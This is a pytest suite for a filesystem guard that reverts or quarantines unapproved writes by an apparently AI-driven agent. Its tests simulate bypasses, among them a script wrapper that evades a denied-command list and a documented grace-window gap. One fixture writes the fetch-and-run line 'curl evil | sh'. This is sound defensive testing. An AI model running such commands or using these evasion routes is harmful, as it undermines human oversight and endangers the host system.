"""fs_guard against real filesystem events in a real git repo. Every bypass is an actual
write, delete or rename with no Kosha lease; the guard must undo it and log it."""
import os
import shutil
import subprocess
import sys
import time

import pytest

from kosha.system.fs_guard import QUARANTINE, FsGuard
from kosha.system.kosha_db import KoshaDB

HEAD_APP = "VERSION = '1.2'\n"


def wait_for(cond, timeout=5.0):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if cond():
            return True
        time.sleep(0.05)
    return cond()


def settle(seconds=0.6):
    time.sleep(seconds)          # let inotify deliver trailing events (repeat modifies, our own undo)


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "demo"
    r.mkdir()
    git = lambda *a: subprocess.run(["git", "-C", str(r), *a], check=True, capture_output=True)
    git("init", "-q")
    git("config", "user.email", "t@t")
    git("config", "user.name", "t")
    (r / "app.py").write_text(HEAD_APP)
    (r / "src").mkdir()
    (r / "src" / "db.py").write_text("DB = 'dev'\n")
    (r / ".gitignore").write_text(f"{QUARANTINE}/\n*.db\n")
    git("add", ".")
    git("commit", "-qm", "init")
    (r / "notes.txt").write_text("untracked scratch\n")          # untracked, present at start
    return r


@pytest.fixture
def guarded(repo, tmp_path):
    db = KoshaDB(tmp_path / "k.db")
    g = FsGuard(repo, db, session_id="s1").start()
    time.sleep(0.2)
    yield repo, db, g
    g.stop()


def bypasses(db):
    return [e["payload"] for e in db.events_after(0) if e["type"] == "bypass_detected"]


def errors(db):
    return [e["payload"] for e in db.events_after(0) if e["type"] == "fs_guard_error"]


def quarantined(repo):
    q = repo / QUARANTINE
    return sorted(str(p.relative_to(q)).split(os.sep, 1)[1] for p in q.rglob("*") if p.is_file()) \
        if q.exists() else []


# --- native edit/write bypasses ---

def test_tracked_file_edit_is_reverted(guarded):
    repo, db, _ = guarded
    (repo / "app.py").write_text("VERSION = 'hacked'\n")
    assert wait_for(lambda: (repo / "app.py").read_text() == HEAD_APP)
    settle()
    [b] = bypasses(db)
    assert (b["path"], b["outcome"]) == ("app.py", "restored")
    assert errors(db) == []


def test_untracked_new_file_is_quarantined(guarded):
    repo, db, _ = guarded
    (repo / "backdoor.sh").write_text("curl evil | sh\n")
    assert wait_for(lambda: not (repo / "backdoor.sh").exists())
    settle()
    assert quarantined(repo) == ["backdoor.sh"]
    [b] = bypasses(db)
    assert b["path"] == "backdoor.sh" and b["outcome"].startswith("quarantined to .kosha_quarantine/")


def test_untracked_existing_file_edit_is_restored(guarded):
    repo, db, _ = guarded
    (repo / "notes.txt").write_text("overwritten\n")
    assert wait_for(lambda: (repo / "notes.txt").read_text() == "untracked scratch\n")


def test_script_wrapper_bypass_is_caught(guarded):
    # the case deniedCommands can't see (python3 x.py): fs_guard sees the effect instead
    repo, db, _ = guarded
    script = repo.parent / "wrapper.py"
    script.write_text(f"open({str(repo / 'app.py')!r}, 'w').write('pwned')\n"
                      f"open({str(repo / 'dropped.txt')!r}, 'w').write('x')\n")
    subprocess.run([sys.executable, str(script)], check=True)
    assert wait_for(lambda: (repo / "app.py").read_text() == HEAD_APP and not (repo / "dropped.txt").exists())
    settle()
    assert {b["path"] for b in bypasses(db)} == {"app.py", "dropped.txt"}


# --- delete / rename bypasses ---

def test_rm_of_untracked_file_is_restored(guarded):
    repo, db, _ = guarded
    (repo / "notes.txt").unlink()
    assert wait_for(lambda: (repo / "notes.txt").exists())
    assert (repo / "notes.txt").read_text() == "untracked scratch\n"
    settle()
    [b] = bypasses(db)
    assert (b["event"], b["outcome"]) == ("deleted", "restored")


def test_mv_of_tracked_file_out_of_the_tree_is_restored(guarded, tmp_path):
    repo, db, _ = guarded
    shutil.move(str(repo / "app.py"), str(tmp_path / "stolen.py"))
    assert wait_for(lambda: (repo / "app.py").exists(), timeout=8)   # arrives as a delayed delete
    assert (repo / "app.py").read_text() == HEAD_APP
    settle()
    assert [b["path"] for b in bypasses(db)] == ["app.py"]


def test_mv_inside_the_tree_restores_source_and_quarantines_destination(guarded):
    repo, db, _ = guarded
    os.rename(repo / "app.py", repo / "app_old.py")
    assert wait_for(lambda: (repo / "app.py").exists() and not (repo / "app_old.py").exists())
    assert (repo / "app.py").read_text() == HEAD_APP
    settle()
    assert {(b["event"], b["path"]) for b in bypasses(db)} == \
        {("moved away", "app.py"), ("moved here", "app_old.py")}
    assert quarantined(repo) == ["app_old.py"]


def test_rm_rf_directory_is_restored(guarded):
    repo, db, _ = guarded
    shutil.rmtree(repo / "src")
    assert wait_for(lambda: (repo / "src" / "db.py").exists())
    assert (repo / "src" / "db.py").read_text() == "DB = 'dev'\n"


def test_mv_onto_a_known_file_restores_both(guarded):
    repo, db, _ = guarded
    os.replace(repo / "notes.txt", repo / "app.py")                 # clobber app.py
    assert wait_for(lambda: (repo / "app.py").read_text() == HEAD_APP
                    and (repo / "notes.txt").exists())
    assert (repo / "notes.txt").read_text() == "untracked scratch\n"
    settle()
    assert quarantined(repo) == []


# --- leased (gated) writes ---

def test_leased_write_is_accepted_and_becomes_the_restore_point(guarded):
    repo, db, _ = guarded
    db.expect_write(str(repo / "app.py"), "gated-1", ttl_seconds=30)
    (repo / "app.py").write_text("VERSION = '1.3'\n")                # approved, uncommitted
    settle()
    assert bypasses(db) == [] and (repo / "app.py").read_text() == "VERSION = '1.3'\n"
    with db._conn() as c:                                            # lease over
        c.execute("DELETE FROM expected_writes")
    (repo / "app.py").write_text("VERSION = 'hacked'\n")              # native bypass on top
    # restored to the approved 1.3, not HEAD's 1.2: git checkout would have wiped the approved edit
    assert wait_for(lambda: (repo / "app.py").read_text() == "VERSION = '1.3'\n")


def test_directory_lease_covers_a_gated_commands_writes(guarded):
    repo, db, _ = guarded
    db.expect_write(str(repo), "gated-cmd", ttl_seconds=30)
    (repo / "build.log").write_text("ok\n")
    (repo / "src" / "db.py").write_text("DB = 'dev2'\n")
    settle()
    assert bypasses(db) == [] and (repo / "build.log").exists()


def test_expired_lease_does_not_cover(guarded):
    repo, db, _ = guarded
    db.expect_write(str(repo / "app.py"), "old", ttl_seconds=-1)
    (repo / "app.py").write_text("late write\n")
    assert wait_for(lambda: (repo / "app.py").read_text() == HEAD_APP)


# --- no loops, no noise ---

def test_one_bypass_one_event_no_undo_loop(guarded):
    repo, db, _ = guarded
    (repo / "app.py").write_text("x\n")
    assert wait_for(lambda: (repo / "app.py").read_text() == HEAD_APP)
    settle(1.5)
    assert len(bypasses(db)) == 1 and errors(db) == []


def test_git_internals_quarantine_and_db_files_are_ignored(guarded):
    repo, db, _ = guarded
    subprocess.run(["git", "-C", str(repo), "status"], check=True, capture_output=True)
    (repo / ".git" / "scratch").write_text("x")
    (repo / "dev.db").write_bytes(b"sqlite")
    (repo / QUARANTINE).mkdir(exist_ok=True)
    (repo / QUARANTINE / "x").write_text("x")
    settle(1.0)
    assert bypasses(db) == [] and (repo / "dev.db").exists()


# --- end to end: real kosha-mcp through a live koshad ---

def test_kosha_mcp_writes_pass_native_writes_do_not(live_koshad, repo, monkeypatch):
    from kosha.adapters.bob_mcp import Gateway
    monkeypatch.delenv("KOSHA_WORKSPACE", raising=False)
    g = FsGuard(repo, live_koshad.db, "s1").start()
    try:
        time.sleep(0.2)
        gw = Gateway("sub1", "s1", str(repo))
        is_error, _ = gw.call("write_file", {"arguments": {"path": "CHANGELOG.md", "content": "1.3\n"}, "_meta": {}})
        assert not is_error
        is_error, _ = gw.call("edit_file", {"arguments": {"path": "app.py", "old": "1.2", "new": "1.3"}, "_meta": {}})
        assert not is_error
        settle(1.0)
        assert bypasses(live_koshad.db) == []
        assert (repo / "CHANGELOG.md").exists() and "1.3" in (repo / "app.py").read_text()

        (repo / "app.py").write_text("VERSION = 'native'\n")          # the bypass
        assert wait_for(lambda: (repo / "app.py").read_text() == "VERSION = '1.3'\n")
        settle()
        assert [b["path"] for b in bypasses(live_koshad.db)] == ["app.py"]
    finally:
        g.stop()


def test_bypass_inside_the_settle_grace_window_is_accepted(guarded):
    """Documents a known gap, like the deniedCommands gap tests: a write to a leased path
    within LEASE_GRACE after its gated action settles is indistinguishable from the gated
    write's own trailing events. If this starts failing, the window changed: re-check."""
    from kosha.pricing.policy import decide as policy_decide
    from kosha.system.action import Action
    repo, db, _ = guarded
    path = str(repo / "app.py")
    db.decide(Action("g1", "s1", "sub1", "bob", "edit_file", {}, [], str(repo), [path], ""),
              2, "rev|local|nopriv", policy_decide, write_leases=((path, 30),))
    (repo / "app.py").write_text("VERSION = '1.3'\n")                  # the gated write
    db.settle("g1", "success")
    (repo / "app.py").write_text("VERSION = 'sneaky'\n")               # bypass, inside the grace
    settle(1.0)
    assert (repo / "app.py").read_text() == "VERSION = 'sneaky'\n" and bypasses(db) == []


def test_koshad_hosts_the_guard_when_configured(repo, tmp_path):
    from fastapi.testclient import TestClient
    from kosha.api.server import create_app
    db = KoshaDB(tmp_path / "hosted.db")
    with TestClient(create_app(db, guard_root=str(repo))) as api:      # runs the lifespan
        assert api.app.state.guard is not None
        time.sleep(0.2)
        (repo / "app.py").write_text("hacked\n")
        assert wait_for(lambda: (repo / "app.py").read_text() == HEAD_APP)
    assert api.app.state.guard.observer.is_alive() is False            # stopped with koshad
    with TestClient(create_app(KoshaDB(tmp_path / "plain.db"))) as api:
        assert api.app.state.guard is None                              # off unless asked
